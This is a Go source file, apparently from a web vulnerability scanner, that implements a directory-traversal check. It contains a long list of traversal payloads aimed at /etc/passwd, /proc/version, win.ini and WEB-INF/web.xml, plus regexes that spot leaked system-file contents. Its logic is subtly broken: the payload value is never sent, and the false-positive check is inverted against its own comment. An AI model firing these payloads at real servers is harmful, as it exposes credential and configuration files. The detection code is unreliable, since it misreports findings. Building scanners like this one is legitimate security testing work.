package directorytraversal

import (
	"glint/logger"
	"glint/pkg/layers"
	"glint/util"
	"log"
	"net/url"
	"regexp"
	"strings"
)

type classInjectionPatterns struct {
	injectionValidator TInjectionValidator
}

type TInjectionValidator struct {
	StartMask string
	EndMask   string
}

type classDirectoryTraversal struct {
	scheme                 layers.Scheme
	InjectionPatterns      classInjectionPatterns
	TargetUrl              string
	inputIndex             int
	reflectionPoint        int
	disableSensorBased     bool
	currentVariation       int
	foundVulnOnVariation   bool
	variations             *util.Variations
	lastJob                layers.LastJob
	lastJobProof           interface{}
	injectionValidator     TInjectionValidator
	scanningWAVSEP         bool
	scanningOwaspBenchmark bool
	isUnix                 bool
	isWindows              bool
	isJava                 bool
	isUnknown              bool
}

var plainTexts = []string{
	"; for 16-bit app support",
	"[MCI Extensions.BAK]",
	"# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.",
	"# localhost name resolution is handled within DNS itself.",
	"[boot loader]",
}

var regexArray = []string{
	`(Linux+\sversion\s+[\d\.\w\-_\+]+\s+\([^)]+\)\s+\(gcc\sversion\s[\d\.\-_]+\s)`,
	`(Linux+\sversion\s+[\d\.\w\-_\+]+\s+&#x28;.*?&#x29;\s&#x28;gcc\sversion\s[\d\.]+\s&#x28;)`,
	`((root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\d\w-\s,]+:\d+:\d+:[\w-_\s,]*:[\w-_\s,\/]*:[\w-_,\/]*[\r\n])`,
	`((root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix)\&\#x3a;[\d\w-\s,]+\&\#x3a;\d+\&\#x3a;[\w-_\s,]*\&\#x3a;[\d\w-\s,]+\&\#x3a;\&\#x2f;)`,
	`<b>Warning<\/b>:\s\sDOMDocument::load\(\)\s\[<a\shref='domdocument.load'>domdocument.load<\/a>\]:\s(Start tag expected|I\/O warning : failed to load external entity).*(Windows\/win.ini|\/etc\/passwd).*\sin\s<b>.*?<\/b>\son\sline\s<b>\d+<\/b>`,
	`(<web-app[\s\S]+<\/web-app>)`,
}

func (c *classInjectionPatterns) searchOnText(text string) (bool, string) {
	// _in := "body"
	// if strings.HasPrefix(text, "HTTP/1.") || strings.HasPrefix(text, "HTTP/0.") {
	// 	_in = "response"
	// }
	for _, v := range plainTexts {
		if strings.Index(text, v) != -1 {
			return true, v
		}
	}

	for _, v := range regexArray {
		r, _ := regexp.Compile(v)
		C := r.FindStringSubmatch(text)
		if len(C) > 0 {
			return true, C[0]
		}
	}

	return false, ""
}

//在响应中查找链接并验证他们
func (c *classDirectoryTraversal) verifyLinksForTraversal(varIndex int, value string, dontEncode bool) bool {
	return false
}

//dontEncode 是否编码
func (c *classDirectoryTraversal) testInjection(varIndex int, value string, dontEncode bool) bool {
	var job = c.lastJob
	b, _ := c.InjectionPatterns.searchOnText(job.Features.Response.String())
	if b {
		// here we need to make sure it's not a false positive
		// mix up the value to cause the injection to fail, the patterns should not be present in response
		Feature, err := c.lastJob.RequestByIndex(varIndex, c.TargetUrl, util.RandStr(5))
		if err != nil {
			logger.Debug("%s", err.Error())
			return false
		}
		var confirmed, _ = c.InjectionPatterns.searchOnText(Feature.Response.String())
		if confirmed {
			return true
		}
		// if isUnix || isUnknown {
		// 	if value == `/etc/passwd` {
		// 		if c.verifyLinksForTraversal(job, `passwd`, value) {
		// 			return false
		// 		}
		// 	}
		// }
	}
	return false
}

func originalValueIsInteresting(origValue string) bool {
	if origValue == "" {
		return false
	}
	// the original value is an url, run all tests
	decodedValue, err := url.QueryUnescape(origValue)
	if err != nil {
		log.Fatal(err)
		return false
	}
	if strings.Index(decodedValue, ":/") != -1 {
		return false
	}
	return true
}

func (c *classDirectoryTraversal) shouldRunAllTests(index int, origValue string) bool {
	if !originalValueIsInteresting(origValue) {
		return false
	}
	// run all tests on WAVSEP or Owasp Benchmark
	if c.scanningWAVSEP || c.scanningOwaspBenchmark {
		return true
	}

	// make a request with the original value again
	body_Feature, err := c.lastJob.RequestByIndex(index, c.TargetUrl, origValue)
	if err != nil {
		logger.Debug("RequestByIndex error:%s", err.Error())
		return false
	}
	// if (!c.(origValue, false)) return true;
	origFeatures := body_Feature

	// var origValueDecoded = url2plain(origValue)
	origValueDecoded, err := url.QueryUnescape(origValue)
	if err != nil {
		log.Fatal(err)
		return false
	}
	// prepare alternative values
	trueValue := "./" + origValue
	falseValue := "../" + origValue

	if strings.HasPrefix(origValueDecoded, "/") {
		trueValue = "//" + origValue
		falseValue = "/z/" + origValue
	} else {
		if strings.HasPrefix(origValueDecoded, "\\") {
			trueValue = "\\" + origValue
			falseValue = "z" + origValue
		} else {
			if strings.HasPrefix(origValueDecoded, "c:/") || strings.HasPrefix(origValueDecoded, "c:\\") {
				trueValue = origValue
				falseValue = "z" + origValue
			}
		}
	}

	// make the request for the false value
	falseFeatures, err := c.lastJob.RequestByIndex(index, c.TargetUrl, falseValue)
	if err != nil {
		logger.Debug("RequestByIndex error:%s", err.Error())
		return false
	}

	if layers.CompareFeatures(&[]layers.MFeatures{origFeatures}, &[]layers.MFeatures{falseFeatures}) {
		logger.Debug("LOG: FAIL 1 (false) - %s", c.scheme.Path)
		return false
	}

	// make the request for the true value
	trueFeatures, err := c.lastJob.RequestByIndex(index, c.TargetUrl, trueValue)
	if err != nil {
		logger.Debug("RequestByIndex error:%s", err.Error())
		return false
	}

	if !layers.CompareFeatures(&[]layers.MFeatures{origFeatures}, &[]layers.MFeatures{trueFeatures}) {
		logger.Debug("LOG: FAIL 1 (false) - %s", c.scheme.Path)
		return false
	}

	return true
}

func (c *classDirectoryTraversal) startTesting() bool {

	if c.variations != nil {
		for _, p := range c.variations.Params {
			if c.foundVulnOnVariation {
				break
			}
			var filePath = strings.ToLower(c.scheme.Path)
			if strings.HasSuffix(filePath, `.aspx`) || strings.HasSuffix(filePath, `.asp`) {
				c.isUnix = false
				c.isWindows = true
			} else if strings.HasSuffix(filePath, `.jsp`) {
				c.isJava = true
			}
			// for WAVSEP send all payloads
			if c.scanningWAVSEP || c.scanningOwaspBenchmark {
				c.isWindows = true
				c.isUnix = true
			}
			//var origValue = p.Value
			var extension = "jpg"
			if strings.Index(p.Value, ".") != -1 {
				arraystr := strings.Split(p.Value, ".")
				extension = arraystr[len(arraystr)-1]
			}
			if c.testInjection(p.Index, "../../../../../../../../../../../../../../etc/passwd", false) {
				return true
			}
			if c.testInjection(p.Index, "../../../../../../../../../../../../../../windows/win.ini", false) {
				return true
			}
			// if c.shouldRunAllTests(p.Index, origValue) {
			if c.isUnix || c.isUnknown {
				if c.testInjection(p.Index, "../../../../../../../../../../../../../../../proc/version", false) {
					return true
				}
				if c.testInjection(p.Index, "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd", false) {
					return true
				}
				if c.testInjection(p.Index, `../../../../../../../../../../etc/passwd%00.`+extension, true) {
					return true
				}
				if c.testInjection(p.Index, "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00."+extension, false) {
					return true
				}
				if c.testInjection(p.Index, "/../..//../..//../..//../..//../..//etc/passwd%00."+extension, true) {
					return true
				}
				if c.testInjection(p.Index, ".\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./etc/passwd", false) {
					return true
				}
				if c.testInjection(p.Index, "/etc/passwd", true) {
					return true
				}
				if c.testInjection(p.Index, "%2fetc%2fpasswd", false) {
					return true
				}
				if c.testInjection(p.Index, "/.././.././.././.././.././.././.././../etc/./passwd%00", false) {
					return true
				}
				if c.testInjection(p.Index, "../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd", false) {
					return true
				}
				if c.testInjection(p.Index, "../././../././../././../././../././../././../././../././../././../././etc/passwd", false) {
					return true
				}
				if c.testInjection(p.Index, "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd", true) {
					return true
				}
				if c.testInjection(p.Index, "invalid../../../../../../../../../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.", true) {
					return true
				}

			}
			if c.isUnix || c.isWindows || c.isUnknown {
				// web-inf web.xml
				if c.testInjection(p.Index, "WEB-INF/web.xml", false) {
					return true
				}
				// web-inf web.xml variant
				if c.testInjection(p.Index, "WEB-INF\\web.xml", false) {
					return true
				}
			}
			if c.isJava {
				if c.testInjection(p.Index, "//WEB-INF/web.xml", false) {
					return true
				}
				if c.testInjection(p.Index, "/static/WEB-INF/web.xml", false) {
					return true
				}
				if c.testInjection(p.Index, "/forward:/WEB-INF/web.xml", false) {
					return true
				}
				if c.testInjection(p.Index, "./WEB-INF/web.xml", false) {
					return true
				}
				if c.testInjection(p.Index, "./WEB-INF/web.xml?", false) {
					return true
				}
				if c.testInjection(p.Index, "../../WEB-INF/web.xml", false) {
					return true
				}
				if c.testInjection(p.Index, "../../WEB-INF/web.xml?", false) {
					return true
				}
				if c.testInjection(p.Index, "/..\\..\\WEB-INF\\web.xml", false) {
					return true
				}
				if c.testInjection(p.Index, "../../../WEB-INF/web.xml", false) {
					return true
				}
				if c.testInjection(p.Index, "../../../WEB-INF/web.xml?", false) {
					return true
				}
				if c.testInjection(p.Index, "../../../../WEB-INF/web.xml", false) {
					return true
				}
				if c.testInjection(p.Index, "//../....//....//WEB-INF/web.xml", false) {
					return true
				}
				if c.testInjection(p.Index, "../../../../../WEB-INF/web.xml", false) {
					return true
				}
				if c.testInjection(p.Index, "../../../../../../WEB-INF/web.xml", false) {
					return true
				}
				if c.testInjection(p.Index, "../WEB-INF/web.xml;x=", false) {
					return true
				}
				if c.testInjection(p.Index, "../../WEB-INF/web.xml;x=", false) {
					return true
				}
				if c.testInjection(p.Index, "../../../WEB-INF/web.xml;x=", false) {
					return true
				}
			}
			//}
		}
	}
	return false
}
